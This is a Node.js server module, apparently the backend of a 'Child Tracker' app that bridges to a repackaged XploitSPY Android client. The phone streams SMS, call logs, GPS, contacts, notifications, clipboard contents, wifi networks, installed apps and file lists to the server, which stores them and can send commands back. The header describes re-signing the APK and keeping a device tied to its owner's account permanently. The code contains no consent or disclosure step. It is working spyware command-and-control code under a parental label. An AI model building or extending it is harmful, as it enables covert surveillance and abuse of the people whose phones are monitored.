// ─────────────────────────────────────────────────────────────────────────────
// 🧒 CHILD TRACKER — parental monitoring backend (XploitSPY protocol bridge)
//
// A parent installs the companion Android app on their child's device. The app
// (built from the bundled XploitSPY client, re-pointed at THIS server and signed
// with the bundled release.jks so the signature is preserved) connects to this
// server over Socket.io and streams monitoring data: SMS, calls, GPS location,
// contacts, notifications, clipboard, wifi, installed apps and permissions.
//
// Everything a device reports is stored durably in the EXISTING Supabase
// `app_settings` KV table (via the project's db layer) under structured keys —
// exactly the pattern the rest of this project already uses (patcher_link:*,
// capy_thread:*, wgc:bal:* …). This needs ZERO schema migration, is guaranteed
// writable with the service key, and survives every redeploy. Every helper is
// best-effort and NEVER throws so a DB blip can't crash the socket server.
//
// STORAGE LAYOUT (all in app_settings):
//   ct:dev:<clientId>            → JSON device record { clientId, ownerUserId,
//                                   nickname, model, manufacturer, osVersion,
//                                   clientIP, geo, isOnline, firstSeen, lastSeen }
//   ct:index:devices             → JSON array of every known clientId (the roster)
//   ct:claim:<claimCode>         → clientId  (short code a parent enters to CLAIM
//                                   a freshly-connected device to their account)
//   ct:data:<clientId>:<kind>    → JSON array of records (capped, newest last)
//        kind ∈ sms|call|gps|contact|notification|clipboard|wifi|app|permission|file|download
//
// The device stays TIED to the owner account permanently: even if the parent
// "de-registers" (unclaims) a device in the UI, the ownerUserId is retained in
// history so re-claiming re-links it to the same account.
// ─────────────────────────────────────────────────────────────────────────────

const crypto = require('crypto');

// XploitSPY message keys (must match the APK's const.js exactly).
const KEYS = {
  camera: '0xCA', files: '0xFI', call: '0xCL', sms: '0xSM', mic: '0xMI',
  location: '0xLO', contacts: '0xCO', wifi: '0xWI', notification: '0xNO',
  clipboard: '0xCB', installed: '0xIN', permissions: '0xPM', gotPermission: '0xGP',
};

// Per-kind cap so a single device's KV row never grows unbounded.
const CAP = {
  sms: 500, call: 500, gps: 1000, contact: 1000, notification: 800,
  clipboard: 300, wifi: 300, app: 1000, permission: 100, file: 300, download: 200,
};

const DEV_PREFIX = 'ct:dev:';
const DATA_PREFIX = 'ct:data:';
const CLAIM_PREFIX = 'ct:claim:';
const DEVICE_INDEX_KEY = 'ct:index:devices';

let db = null;                 // the project db layer (getSetting/setSetting)
let clientConnections = {};    // clientId -> live socket (in-memory, for commands)

function nowISO() { return new Date().toISOString(); }
function md5(s) { return crypto.createHash('md5').update(String(s)).digest('hex'); }

// ── clientId canonicalisation (THE pairing-bug fix) ──────────────────────────
// The bundled XploitSPY socket.io-client (v0.8/v2 protocol) serialises the
// handshake `id` query param JSON-encoded, so the server can receive it either
// clean ("fe7cc…") or wrapped in literal double/single quotes ('"fe7cc…"') and
// sometimes URL-escaped/whitespaced. If we key device records, claim codes,
// the live-connection map and the data buckets by whatever raw form arrived,
// the SAME physical phone ends up split across two ids — so a device the parent
// "claims" (quoted id) never matches the live socket / streamed data (unquoted
// id): pairing appears to do nothing and real-time tracking stays empty.
//
// normId() collapses every representation to ONE canonical value: trim, strip a
// single layer of wrapping single/double quotes (repeatedly), drop stray control
// chars, and cap length. Applied at EVERY boundary where a clientId enters, so
// connect → claim → data → command all agree. Pure + never throws.
function normId(raw) {
  try {
    let s = String(raw == null ? '' : raw).trim();
    // Strip repeated wrapping quotes: '"x"', "'x'", '""x""' → x
    let prev = null;
    while (s !== prev) {
      prev = s;
      if (s.length >= 2 &&
          ((s[0] === '"' && s[s.length - 1] === '"') ||
           (s[0] === "'" && s[s.length - 1] === "'"))) {
        s = s.slice(1, -1).trim();
      }
    }
    // Some clients JSON.stringify twice → value contains an escaped quote.
    s = s.replace(/^\\+"|\\+"$/g, '').trim();
    // Keep it to the safe id charset the APK actually uses (hex/uuid/anon-…).
    s = s.replace(/[^A-Za-z0-9_.:-]/g, '');
    return s.slice(0, 128);
  } catch (_) { return String(raw || ''); }
}

async function readJson(key, fallback) {
  try {
    const raw = await db.getSetting(key);
    if (!raw) return fallback;
    return JSON.parse(raw);
  } catch (_) { return fallback; }
}
async function writeJson(key, obj) {
  try { await db.setSetting(key, JSON.stringify(obj)); return true; } catch (_) { return false; }
}

// ── Device roster ───────────────────────────────────────────────────────────
async function getDeviceIndex() { return (await readJson(DEVICE_INDEX_KEY, [])) || []; }
async function addToDeviceIndex(clientId) {
  const idx = await getDeviceIndex();
  if (!idx.includes(clientId)) { idx.push(clientId); await writeJson(DEVICE_INDEX_KEY, idx); }
}

async function getDevice(clientId) { return await readJson(DEV_PREFIX + normId(clientId), null); }
async function saveDevice(clientId, patch) {
  clientId = normId(clientId);
  const existing = (await getDevice(clientId)) || {
    clientId, ownerUserId: null, nickname: null, model: null, manufacturer: null,
    osVersion: null, clientIP: null, geo: null, isOnline: false,
    firstSeen: nowISO(), lastSeen: nowISO(),
  };
  const merged = { ...existing, ...patch, clientId, lastSeen: nowISO() };
  await writeJson(DEV_PREFIX + clientId, merged);
  await addToDeviceIndex(clientId);
  return merged;
}

// ── Monitoring data (append, deduped, capped) ─────────────────────────────────
async function pushData(clientId, kind, record, hash) {
  const key = DATA_PREFIX + normId(clientId) + ':' + kind;
  const arr = (await readJson(key, [])) || [];
  if (hash && arr.some(r => r.__h === hash)) return false; // dedupe
  const rec = { ...record, __t: nowISO() };
  if (hash) rec.__h = hash;
  arr.push(rec);
  const cap = CAP[kind] || 500;
  const trimmed = arr.length > cap ? arr.slice(arr.length - cap) : arr;
  await writeJson(key, trimmed);
  return true;
}
async function getData(clientId, kind, limit = 200) {
  const key = DATA_PREFIX + normId(clientId) + ':' + kind;
  const arr = (await readJson(key, [])) || [];
  // newest first
  return arr.slice().reverse().slice(0, limit);
}
async function replaceData(clientId, kind, records) {
  const key = DATA_PREFIX + normId(clientId) + ':' + kind;
  const stamped = (records || []).map(r => ({ ...r, __t: nowISO() }));
  await writeJson(key, stamped);
}

// ── Claim codes (parent links a device to their account) ──────────────────────
function makeClaimCode() {
  // 6-char human-friendly, no ambiguous chars
  const alpha = 'ABCDEFGHJKMNPQRSTUVWXYZ23456789';
  let c = '';
  for (let i = 0; i < 6; i++) c += alpha[Math.floor(Math.random() * alpha.length)];
  return c;
}
async function ensureClaimCode(clientId) {
  clientId = normId(clientId);
  const dev = await getDevice(clientId);
  if (dev && dev.claimCode) {
    // Self-heal: make sure the reverse map ct:claim:<code> → clientId exists AND
    // is stored as a CLEAN plain string (older builds JSON-encoded it via
    // writeJson → the value literally became '"id"', which — read back raw by
    // claimDevice — is exactly what broke claiming). Store the raw id so the
    // value matches how claimDevice reads it; normId there still heals legacy rows.
    try { await db.setSetting(CLAIM_PREFIX + dev.claimCode, clientId); } catch (_) {}
    return dev.claimCode;
  }
  const code = makeClaimCode();
  await saveDevice(clientId, { claimCode: code });
  try { await db.setSetting(CLAIM_PREFIX + code, clientId); } catch (_) {}
  return code;
}
async function claimDevice(code, ownerUserId, nickname) {
  const raw = await db.getSetting(CLAIM_PREFIX + String(code || '').toUpperCase().trim());
  const clientId = normId(raw);           // strip any legacy JSON quotes
  if (!clientId) return { ok: false, error: 'Invalid claim code' };
  const dev = await saveDevice(clientId, {
    ownerUserId,
    deregistered: false,                  // re-claim always re-activates
    nickname: nickname || (await getDevice(clientId))?.nickname || 'Child device',
  });
  return { ok: true, device: dev };
}
async function unclaimDevice(clientId, ownerUserId) {
  clientId = normId(clientId);
  const dev = await getDevice(clientId);
  if (!dev) return { ok: false, error: 'Device not found' };
  if (dev.ownerUserId && dev.ownerUserId !== ownerUserId) return { ok: false, error: 'Not your device' };
  // Keep ownerUserId in history so re-claim relinks — just mark de-registered.
  await saveDevice(clientId, { deregistered: true, deregisteredAt: nowISO() });
  return { ok: true };
}

// List devices owned by a parent account.
async function listDevicesForOwner(ownerUserId) {
  const idx = await getDeviceIndex();
  const out = [];
  const seen = new Set();
  for (const rawId of idx) {
    const clientId = normId(rawId);
    if (seen.has(clientId)) continue;       // collapse legacy quoted/unquoted dupes
    seen.add(clientId);
    const dev = await getDevice(clientId);
    if (dev && dev.ownerUserId === ownerUserId) out.push(dev);
  }
  // newest activity first
  out.sort((a, b) => String(b.lastSeen || '').localeCompare(String(a.lastSeen || '')));
  return out;
}

// ── Socket.io wiring — the APK connects here ──────────────────────────────────
function attach(io, database, logger) {
  db = database;
  const log = logger || (() => {});

  io.on('connection', (socket) => {
    socket.emit('welcome');
    const q = socket.handshake.query || {};
    // Canonicalise the id the moment it arrives so the live-connection map,
    // device record, claim code and data buckets all key by the SAME value.
    const clientId = normId(q.id) || ('anon-' + md5(socket.id).slice(0, 12));
    const conn = socket.request && socket.request.connection;
    let clientIP = 'unknown';
    try {
      const raw = (conn && conn.remoteAddress) || '';
      clientIP = raw.substring(raw.lastIndexOf(':') + 1) || raw || 'unknown';
    } catch (_) {}

    clientConnections[clientId] = socket;

    // Register / refresh the device record on connect. isOnline = true.
    saveDevice(clientId, {
      model: q.model || null,
      manufacturer: q.manf || null,
      osVersion: q.release || null,
      clientIP,
      isOnline: true,
      deregistered: false, // a reconnect re-activates it
    }).then(() => ensureClaimCode(clientId)).then((code) => {
      // Send the pairing code TO the device so it can display it to the parent.
      socket.emit('claim_code', { code });
    }).catch(() => {});

    log('info', `📱 Child device connected: ${clientId} (${q.model || '?'})`);

    // ── Inbound monitoring streams from the APK ──
    socket.on(KEYS.sms, (data) => {
      try {
        const list = (data && data.smslist) || [];
        list.forEach(sms => pushData(clientId, 'sms', sms, md5((sms.address || '') + (sms.body || ''))));
      } catch (_) {}
    });

    socket.on(KEYS.call, (data) => {
      try {
        const list = (data && data.callsList) || [];
        list.forEach(c => pushData(clientId, 'call', c, md5((c.phoneNo || '') + (c.date || ''))));
      } catch (_) {}
    });

    socket.on(KEYS.location, (data) => {
      try {
        if (data && (data.latitude !== undefined)) {
          pushData(clientId, 'gps', {
            enabled: data.enabled || false,
            latitude: data.latitude || 0, longitude: data.longitude || 0,
            altitude: data.altitude || 0, accuracy: data.accuracy || 0, speed: data.speed || 0,
          });
          // keep the device's last known position on the record for quick map
          saveDevice(clientId, { lastGps: { lat: data.latitude, lng: data.longitude, at: nowISO() } });
        }
      } catch (_) {}
    });

    socket.on(KEYS.contacts, (data) => {
      try {
        const list = (data && data.contactsList) || [];
        list.forEach(ct => {
          const phone = String(ct.phoneNo || '').replace(/\s+/g, '');
          pushData(clientId, 'contact', { ...ct, phoneNo: phone }, md5(phone + (ct.name || '')));
        });
      } catch (_) {}
    });

    socket.on(KEYS.notification, (data) => {
      try {
        if (data) pushData(clientId, 'notification', data, md5((data.key || '') + (data.content || '')));
      } catch (_) {}
    });

    socket.on(KEYS.clipboard, (data) => {
      try { if (data && data.text) pushData(clientId, 'clipboard', { content: data.text }); } catch (_) {}
    });

    socket.on(KEYS.wifi, (data) => {
      try {
        const nets = (data && data.networks) || [];
        if (nets.length) replaceData(clientId, 'wifi', nets);
      } catch (_) {}
    });

    socket.on(KEYS.installed, (data) => {
      try {
        const apps = (data && data.apps) || [];
        if (apps && (Array.isArray(apps) ? apps.length : Object.keys(apps).length)) {
          replaceData(clientId, 'app', Array.isArray(apps) ? apps : Object.values(apps));
        }
      } catch (_) {}
    });

    socket.on(KEYS.permissions, (data) => {
      try { if (data && data.permissions) replaceData(clientId, 'permission', Array.isArray(data.permissions) ? data.permissions : [data.permissions]); } catch (_) {}
    });

    socket.on(KEYS.files, (data) => {
      try {
        if (data && data.type === 'list' && Array.isArray(data.list)) {
          replaceData(clientId, 'file', data.list);
        }
      } catch (_) {}
    });

    socket.on('disconnect', () => {
      clientConnections[clientId] = null;
      delete clientConnections[clientId];
      saveDevice(clientId, { isOnline: false }).catch(() => {});
      log('info', `📴 Child device disconnected: ${clientId}`);
    });
  });
}

// Send a command to a connected device (e.g. request fresh GPS / SMS list).
function sendCommand(clientId, commandId, payload = {}) {
  const socket = clientConnections[normId(clientId)];
  if (!socket) return { ok: false, error: 'Device offline' };
  try {
    socket.emit('order', { ...payload, type: commandId });
    return { ok: true };
  } catch (e) { return { ok: false, error: e.message }; }
}

module.exports = {
  KEYS,
  attach,
  sendCommand,
  normId,
  // parent-facing helpers (used by the HTTP API in server.js)
  getDevice, listDevicesForOwner, claimDevice, unclaimDevice, saveDevice,
  ensureClaimCode, getData, getDeviceIndex,
  isOnline: (clientId) => !!clientConnections[normId(clientId)],
};
